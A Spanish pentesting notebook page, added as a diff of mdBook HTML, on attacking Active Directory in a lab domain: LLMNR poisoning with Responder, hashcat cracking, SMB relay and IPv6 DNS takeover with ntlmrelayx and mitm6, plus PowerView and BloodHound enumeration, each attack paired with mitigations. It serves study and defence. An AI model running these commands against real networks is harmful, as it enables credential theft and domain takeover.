@@ -1,0 +1,763 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Atacando Active Directory - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../guides/active_directory/1_attacking.html" class="active"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="atacando-active-directory"><a class="header" href="#atacando-active-directory">Atacando Active Directory <!-- omit from toc --></a></h1>
+<h2 id="tabla-de-contenido"><a class="header" href="#tabla-de-contenido">Tabla de Contenido <!-- omit from toc --></a></h2>
+<ul>
+<li><a href="#llmnr-poisoning">LLMNR Poisoning</a>
+<ul>
+<li><a href="#qu%C3%A9-es-llmnr">¿Qué es LLMNR?</a></li>
+<li><a href="#ejecuci%C3%B3n">Ejecución</a></li>
+<li><a href="#defensas">Defensas</a></li>
+</ul>
+</li>
+<li><a href="#smb-relay">SMB Relay</a>
+<ul>
+<li><a href="#qu%C3%A9-es">¿Qué es?</a></li>
+<li><a href="#requisitos">Requisitos</a></li>
+<li><a href="#ejecuci%C3%B3n-1">Ejecución</a></li>
+<li><a href="#estrategias-de-mitigaci%C3%B3n">Estrategias de mitigación</a></li>
+</ul>
+</li>
+<li><a href="#ipv6-attacks">IPv6 Attacks</a>
+<ul>
+<li><a href="#ipv6-dns-takeover">IPv6 DNS Takeover</a>
+<ul>
+<li><a href="#ejecuci%C3%B3n-2">Ejecución</a></li>
+</ul>
+</li>
+<li><a href="#estrategias-de-mitigaci%C3%B3n-1">Estrategias de mitigación</a></li>
+</ul>
+</li>
+<li><a href="#estrategiasproceso-de-pentesting-a-ambiente">Estrategias/proceso de pentesting a ambiente</a></li>
+<li><a href="#post-explotaci%C3%B3n">Post-Explotación</a>
+<ul>
+<li><a href="#enumeraci%C3%B3n">Enumeración</a>
+<ul>
+<li><a href="#powerview">PowerView</a></li>
+<li><a href="#bloodhound">BloodHound</a>
+<ul>
+<li><a href="#recopilaci%C3%B3n">Recopilación</a></li>
+<li><a href="#carga-de-informaci%C3%B3n">Carga de información</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#ataques">Ataques</a>
+<ul>
+<li><a href="#privilege-requirements">Privilege Requirements</a></li>
+<li><a href="#abusing-pre-authentication">Abusing Pre-Authentication</a>
+<ul>
+<li><a href="#kerbrute">Kerbrute</a></li>
+</ul>
+</li>
+<li><a href="#harvesting--brute-forcing-tickets">Harvesting &amp; Brute-Forcing Tickets</a>
+<ul>
+<li><a href="#rubeus">Rubeus</a></li>
+<li><a href="#harvesting">Harvesting</a></li>
+<li><a href="#brute-forcing--password-spraying">Brute-Forcing | Password-Spraying</a></li>
+</ul>
+</li>
+<li><a href="#kerberoasting">Kerberoasting</a>
+<ul>
+<li><a href="#ejecuci%C3%B3n---rubeus">Ejecución - Rubeus</a></li>
+<li><a href="#ejecuci%C3%B3n---impacket">Ejecución - Impacket</a></li>
+<li><a href="#crackeo">Crackeo</a></li>
+<li><a href="#qu%C3%A9-puede-hacer-una-cuenta-de-servicio">¿Qué puede hacer una cuenta de servicio?</a></li>
+<li><a href="#mitigaci%C3%B3n">Mitigación</a></li>
+</ul>
+</li>
+<li><a href="#as-rep-roasting">AS-REP Roasting</a>
+<ul>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#ejecuci%C3%B3n---rubeus-1">Ejecución - Rubeus</a></li>
+<li><a href="#ejecuci%C3%B3n---impacket-1">Ejecución - Impacket</a></li>
+<li><a href="#crackeo-1">Crackeo</a></li>
+<li><a href="#mitigaci%C3%B3n-1">Mitigación</a></li>
+</ul>
+</li>
+<li><a href="#pass-the-ticket">Pass The Ticket</a>
+<ul>
+<li><a href="#overview-1">Overview</a></li>
+<li><a href="#ejecuci%C3%B3n-3">Ejecución</a></li>
+<li><a href="#mitigaci%C3%B3n-2">Mitigación</a></li>
+</ul>
+</li>
+<li><a href="#pass-the-hash">Pass The Hash</a>
+<ul>
+<li><a href="#dumpeo-de-hashes">Dumpeo de hashes</a></li>
+<li><a href="#mitigaciones">Mitigaciones</a></li>
+</ul>
+</li>
+<li><a href="#token-impersonation">Token Impersonation</a>
+<ul>
+<li><a href="#ejecuci%C3%B3n-4">Ejecución</a>
+<ul>
+<li><a href="#metasploit">Metasploit</a></li>
+<li><a href="#non-metasploit">Non-metasploit</a></li>
+</ul>
+</li>
+<li><a href="#mitigaci%C3%B3n-3">Mitigación</a></li>
+</ul>
+</li>
+<li><a href="#group-policy-preferences-gpp---aka-ms14-025">Group Policy Preferences (GPP) - AKA MS14-025</a>
+<ul>
+<li><a href="#ejecuci%C3%B3n-5">Ejecución</a></li>
+</ul>
+</li>
+<li><a href="#mimikatz">Mimikatz</a>
+<ul>
+<li><a href="#credential-dumping">Credential Dumping</a></li>
+</ul>
+</li>
+<li><a href="#goldensilver-tickets">Golden/Silver Tickets</a>
+<ul>
+<li><a href="#krbtgt-overview">KRBTGT Overview</a></li>
+<li><a href="#attack-overview">Attack Overview</a></li>
+<li><a href="#ejecuci%C3%B3n-6">Ejecución</a></li>
+</ul>
+</li>
+<li><a href="#kerberos-backdoors">Kerberos Backdoors</a>
+<ul>
+<li><a href="#skeleton-key-overview">Skeleton Key Overview</a></li>
+<li><a href="#ejecuci%C3%B3n-7">Ejecución</a></li>
+</ul>
+</li>
+<li><a href="#abusando-de-aclsaces">Abusando de ACLs/ACEs</a>
+<ul>
+<li><a href="#readgmsapassword">ReadGMSAPassword</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#referencias">Referencias</a></li>
+</ul>
+<h2 id="llmnr-poisoning"><a class="header" href="#llmnr-poisoning">LLMNR Poisoning</a></h2>
+<h3 id="qué-es-llmnr"><a class="header" href="#qué-es-llmnr">¿Qué es LLMNR?</a></h3>
+<ul>
+<li>Link-Local Multicast Name Resolution (&quot;Prácticamente&quot; se podría considerar DNS).</li>
+<li>Usado para identificar hosts cuando falla en esa tarea el DNS.</li>
+<li>Anteriormente conocido como NBT-NS.</li>
+<li>La falla principal es que los servicios ocupan un nombre de usuario del sistema operativo y un hash NTLMv2 a los cuales responden.</li>
+</ul>
+<p><img src="images/llmnr.png" alt="Información general" /></p>
+<h3 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h3>
+<ol>
+<li>Ejecutar responder (herramienta de impacket) <code>responder -I tun0 -rdw -v</code>.</li>
+</ol>
+<p><img src="images/llmnr-responder.png" alt="Responder" /></p>
+<ol start="2">
+<li>Evento ocurre</li>
+</ol>
+<p><img src="images/llmnr-event.png" alt="Evento" /></p>
+<ol start="3">
+<li>Obtener hashes</li>
+</ol>
+<p><img src="images/llmnr-hashes.png" alt="Hashes" /></p>
+<ol start="4">
+<li>Crackeo de hashes <code>hashcat -m 5600 hashes.txt rockyou.txt</code></li>
+</ol>
+<p><img src="images/llmnr-crack.png" alt="Crackeo" /></p>
+<h3 id="defensas"><a class="header" href="#defensas">Defensas</a></h3>
+<p>La mejor defensa para este escenario es deshabilitar LLMNR y NBT-NS:</p>
+<ul>
+<li>Para deshabilitar LLMNR, se debe seleccionar &quot;Turn OFF Multicast Name Resolution&quot; en <code>Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client en el Group Policy Editor</code></li>
+<li>Para deshabilitar NBT-NS, se requiere navegar a <code>Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab y seleccionar &quot;Disable NetBIOS over TCP/IP&quot;</code>.</li>
+</ul>
+<p>En una compañia en donde es necesario usarse o no se puede deshabilitar LLMNR/NBT-NS, lo mejor que se puede realizar es:</p>
+<ul>
+<li>Requerir Network Access Control.</li>
+<li>Requerir contraseñas de usuario fuertes (ejemplo, 14+ carácteres de longitud y límite de uso de palabras comúnes). Entre más larga y compleja la contraseña, más difícil será crackear el hash.</li>
+</ul>
+<h2 id="smb-relay"><a class="header" href="#smb-relay">SMB Relay</a></h2>
+<h3 id="qué-es"><a class="header" href="#qué-es">¿Qué es?</a></h3>
+<p>En vez de buscar crackear los hashes obtenidos con responder, en su lugar se pueden retransmitir a máquinas en específico y potencialmente obtener acceso.</p>
+<h3 id="requisitos"><a class="header" href="#requisitos">Requisitos</a></h3>
+<ul>
+<li>SMB signing se debe encontrar deshabilitado en el objetivo.</li>
+<li>Las credenciales de usuario retransmitidas deberán ser de un administrador de la máquina.</li>
+</ul>
+<h3 id="ejecución-1"><a class="header" href="#ejecución-1">Ejecución</a></h3>
+<ol>
+<li>Modificar <code>responder.conf</code></li>
+</ol>
+<p><img src="images/responder-conf.png" alt="responder.conf" /></p>
+<ol start="2">
+<li>
+<p>Ejecutar responder <code>responder.py -I tun0 -rdw -v</code>.</p>
+</li>
+<li>
+<p>Configurar relay a utilizar <code>impacket-ntlmrelayx -tf targets.txt -smb2support</code>.</p>
+</li>
+</ol>
+<p><img src="images/ntlmrelay.png" alt="Impacket ntlmrelay" /></p>
+<ol start="4">
+<li>Evento ocurre</li>
+</ol>
+<p><img src="images/llmnr-event.png" alt="Evento" /></p>
+<ol start="5">
+<li>Win (Pass the hash o Cracking)</li>
+</ol>
+<p><img src="images/relay-win.png" alt="Win" /></p>
+<h3 id="estrategias-de-mitigación"><a class="header" href="#estrategias-de-mitigación">Estrategias de mitigación</a></h3>
+<ul>
+<li>Habilitar SMB Signing en todos los dispositivos.
+<ul>
+<li>Ventaja: Para completamente el ataque.</li>
+<li>Desventaja: Puede causar problemas de rendimiento con transferencia de archivos.</li>
+</ul>
+</li>
+<li>Deshabilitar autenticación NTLM en la red.
+<ul>
+<li>Ventaja: Para completamente el ataque.</li>
+<li>Desventaja: Si Kerberos deja de funcionar, Windows regresa por default a NTLM.</li>
+</ul>
+</li>
+<li>Gestionar nivel de cuentas.
+<ul>
+<li>Ventaja: Limita a los administradores de dominio a tareas específicas (ejemplo, permitiéndoles loguearse sólo a servidores de dominio, etc.).</li>
+<li>Desventaja: Hacer cumplir la política podría resultar difícil.</li>
+</ul>
+</li>
+<li>Restricción de administrador local.
+<ul>
+<li>Ventaja: Puede prevenir el movimiento lateral.</li>
+<li>Desventaja: Potencial incremento de la cantidad de tickets de service desk.</li>
+</ul>
+</li>
+</ul>
+<h2 id="ipv6-attacks"><a class="header" href="#ipv6-attacks">IPv6 Attacks</a></h2>
+<h3 id="ipv6-dns-takeover"><a class="header" href="#ipv6-dns-takeover">IPv6 DNS Takeover</a></h3>
+<p>La forma de ejecutar se basa en la herramienta <a href="https://github.com/dirkjanm/mitm6">mitm6</a>, la cual abusa la configuración por defecto de Windows para tomar el control del servidor DNS predeterminado. Haciéndolo mediante replicación de mensajes por medio de DHCPv6, proveyendo a la víctimas un enlace local con una dirección IPv6 y configurando a los hosts atacantes como servidor DNS por defecto. Como servidor DNS, <code>mitm6</code> selectivamente replicará las consultas DNS de los atacantes, eligiendo y redirigiento el tráfico víctima a la máquina del atacante en lugar del servidor legítimo. En <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">esta entrada del blog</a> se puede encontrar una explicación completa del ataque. <code>mitm6</code> está diseñada para trabajar en conjunto con <code>ntlmrelayx</code> de impacket para suplantación de WPAD y retransmisión de credenciales.</p>
+<h4 id="ejecución-2"><a class="header" href="#ejecución-2">Ejecución</a></h4>
+<p>Es importante señalar que en el ambiente debe estar habilitado <code>LDAPS</code>, en la mayoría de los ambientes se encuentra habilitado.</p>
+<ol>
+<li>Ejecutar mitm6 indicando el dominio <code>mitm6 -d dsouls.local</code></li>
+<li>Ejecutar ntlmrelayx indicando ip de domain controller, WPAD y loot (en caso de querelo) <code>impacket-ntlmrelayx -6 -t ldaps://192.168.111.149 -wh fakewpad.dsouls.local -l lootme</code>.</li>
+<li>A la hora de efectuarse, la información recopilada se almacenara en la carpeta indicada para loot.</li>
+</ol>
+<p><img src="images/ipv6-loot.png" alt="Loot obtenido" /></p>
+<p><img src="images/ipv6-loot-firefox.png" alt="Información recopilada" /></p>
+<ol start="4">
+<li>Si llegará autenticarse un administrador de dominio se ejecutará un alta de usuario nuevo con contraseña indicada en el log de <code>ntlmrlayx</code>.</li>
+</ol>
+<p><img src="images/ipv6-user.png" alt="Alta de usuario" /></p>
+<h3 id="estrategias-de-mitigación-1"><a class="header" href="#estrategias-de-mitigación-1">Estrategias de mitigación</a></h3>
+<ol>
+<li>El envenamiento por IPv6 abusa el hecho de que Windows consulta por una dirección IPv6 incluso en ambientes donde sólo está habilitado IPv4. Si internamente no se usa IPv6, la forma más segura de prevenir <code>mitm6</code> es bloqueando tráfico DHCPv6 y anuncios entrantes del router en el Firewall de Windows vía Group Policy. Deshabilitar IPv6 completamente podría traer consigo efectos secundarios no deseados. Configurando las siguientes reglas para bloquear en vez de permitir, previene que el ataque funcione.
+<ul>
+<li>(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)</li>
+<li>(Inbound) Core Networking - Router Advertisement (ICMPv6-In)</li>
+<li>(Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)</li>
+</ul>
+</li>
+<li>Si WPAD no es usado internamente, deshabilitarlo vía Group Policy y deshabilitar el servicio WinHttpAutoProxySvc.</li>
+<li>Retransmisión a LDAP y LDAPS sólo puede ser mitigada habilitando LDAP singning y LDAP channel binding.</li>
+<li>Considerar etiquetar/mover a los usuarios administrativos al grupo de Protected Users o marcarlos como una Cuenta, es sensible y no puede delegarse, lo que prevendrá la impersonificación de ese usuario vía delegación.</li>
+</ol>
+<h2 id="estrategiasproceso-de-pentesting-a-ambiente"><a class="header" href="#estrategiasproceso-de-pentesting-a-ambiente">Estrategias/proceso de pentesting a ambiente</a></h2>
+<ul>
+<li>Inicial el día con <code>mitm6</code> o <code>responder</code>.</li>
+<li>Ejecutar escaneos para generar tráfico.</li>
+<li>Si los escaneos están tardando mucho, buscar sitios web dentro dle alcance (http_version - módulo de metasploit).</li>
+<li>Buscar credenciales por default en logins web:
+<ul>
+<li>Impresoras.</li>
+<li>Jenkins.</li>
+<li>Etc.</li>
+</ul>
+</li>
+<li>Pensar fuera de la caja.</li>
+</ul>
+<h2 id="post-explotación"><a class="header" href="#post-explotación">Post-Explotación</a></h2>
+<h3 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h3>
+<h4 id="powerview"><a class="header" href="#powerview">PowerView</a></h4>
+<p>Tabla de comandos relevantes, verificar documentación y/o <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">cheatsheet anexada</a>.</p>
+<ul>
+<li><code>Get-NetDomain</code>: Obtiene información del dominio.</li>
+</ul>
+<p><img src="images/powerview-net-1.png" alt="Net Domain" /></p>
+<ul>
+<li><code>Get-NetDomainController</code>: Identifica y obtiene información de los controladores de dominio.</li>
+</ul>
+<p><img src="images/powerview-net-2.png" alt="Net Domain" /></p>
+<ul>
+<li><code>Get-DomainPolicy</code>: Obtiene las políticas del dominio.</li>
+</ul>
+<p><img src="images/powerview-policy.png" alt="Net Domain" /></p>
+<ul>
+<li><code>Get-NetUser</code>: Obtiene información acerca de los usuarios (considerar la propiedad <code>logoncount</code> podría existir la posibilidad que se encuentren usuarios HoneyPot).</li>
+</ul>
+<p><img src="images/powerview-user.png" alt="Net Domain" /></p>
+<ul>
+<li><code>Get-NetComputer</code>: Obtiene toda la información de las computadoras enroladas en el dominio.</li>
+</ul>
+<p><img src="images/powerview-computer.png" alt="Net Domain" /></p>
+<ul>
+<li><code>Invoke-ShareFinder</code>: Realiza un búsqueda de las carpetas compartidas por medio de smb.</li>
+</ul>
+<p><img src="images/powerview-share.png" alt="Net Domain" /></p>
+<ul>
+<li><code>Get-NetGPO</code>: Obtiene infomación de todas las Group Policies.</li>
+</ul>
+<p><img src="images/powerview-gpo.png" alt="Net Domain" /></p>
+<h4 id="bloodhound"><a class="header" href="#bloodhound">BloodHound</a></h4>
+<h5 id="recopilación"><a class="header" href="#recopilación">Recopilación</a></h5>
+<p>Recopilación de información con <code>SharpHound.ps1</code> disponible en el <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">repositorio oficial de BloodHound de recolectores</a>.</p>
+<p><code>Invoke-BloodHound -CollectionMethod All -Domain DSOULS.local -ZipFileName file.zip</code></p>
